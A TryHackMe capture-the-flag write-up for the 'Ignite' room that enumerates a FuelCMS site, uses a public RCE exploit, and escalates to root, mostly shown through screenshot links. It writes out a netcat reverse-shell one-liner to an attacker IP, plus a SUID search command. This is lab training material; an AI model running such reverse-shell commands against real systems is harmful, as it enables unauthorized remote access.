# Writeup for Room "Ignite"

This is the writeup for the box Ignite

## 🔍 Enumeration Phase

## 1. WebSite
- The website is running on Apache.
- The following information was found in `robots.txt`.

    ![WebSite](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/ignite/screenshots/00.png)

    ![robots.txt](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/ignite/screenshots/01.png)

## 2. Fuzzing
-  **Dirbuster / Gobuster** was used to find directories and files, the following images show the results:
  
    ![Fuzzing](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/ignite/screenshots/02.png)

    ![Fuzzing-2](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/ignite/screenshots/03.png)

- Dirsearch was used to find more directories and files, the following images show the results:

    ![dirsearch](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/ignite/screenshots/04.png)

    ![dirsearch-2](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/ignite/screenshots/05.png)


## 📡 3. Nmap Scan
- The following information was found:
  - The port 80 is open. **HTTP (Apache)**

    ![Nmap Scan](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/ignite/screenshots/06.png)

## 4. What WebSite?
- whatweb gives me:

    ![whatweb](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/ignite/screenshots/07.png)

## 🌐🖥️ 5. WebSite
- The login page for FuelCMS:

    ![FuelCMS](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/ignite/screenshots/08.png)

- We also have a ```README.md``` file 

    ![README.md](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/ignite/screenshots/09.png)

- We also have a ```composer.json``` file 

    ![composer.json](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/ignite/screenshots/10.png)

## 6. Searchsploit - Reverse Shell 
- I use searchsploit to search for FuelCMS exploits and download the Remote Code Execution (RCE) version 3.

    ![searchsploit](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/ignite/screenshots/11.png)

- In addition, the exploit gives me more information about the cms:

    ![exploit](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/ignite/screenshots/12.png)

- I use the following command for executing a exploit in python:

    ![exploit-2](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/ignite/screenshots/13.png)

- After executing differents commands, I get a reverse shell:

    ![reverse-shell](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/ignite/screenshots/14.png)

    ![reverse-shell-2](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/ignite/screenshots/15.png)

> [!NOTE]
> The one that worked was the last one : 
> ```rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.9.3.188 4444 > /tmp/f```

- Now that I have a reverse shell, I decided to get a beatifull reverse shell and I moved to the home directory named ```www-data``` and I found the first flag 

    ![first-flag](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/ignite/screenshots/16.png)

## 🐚💻🚀 7. Privilege Escalation
- I used the command ```find / -perm -u=s -type f 2> /dev/null``` to search for files with SUID permissions.

    ![find](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/ignite/screenshots/17.png)

- I uploaded ```linpeas.sh``` to ```/tmp``` to look for privilege escalation vulnerabilities:

    ![linpeas](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/ignite/screenshots/18.png)

- The one that caught my attention the most was pwnkit.

    ![pwnkit](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/ignite/screenshots/19.png)

- I checked that the machine had ```gcc``` available.

    ![gcc](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/ignite/screenshots/20.png)

- I downloaded the ```pwned``` exploit and I compiled it 

    ![pwned](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/ignite/screenshots/21.png)

- After a while trying, I was getting errors like:

    ![error](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/ignite/screenshots/22.png)

- I checked linpeas again and voilà: there was a password.

    ![linpeas-2](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/ignite/screenshots/23.png)

- I have used the password for escalating privileges.

    ![escalate](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/ignite/screenshots/24.png)

    ![escalate-2](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/ignite/screenshots/25.png)

- If I have searched for the ```root.txt``` file, we get the flag.

    ![root.txt](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/ignite/screenshots/26.png)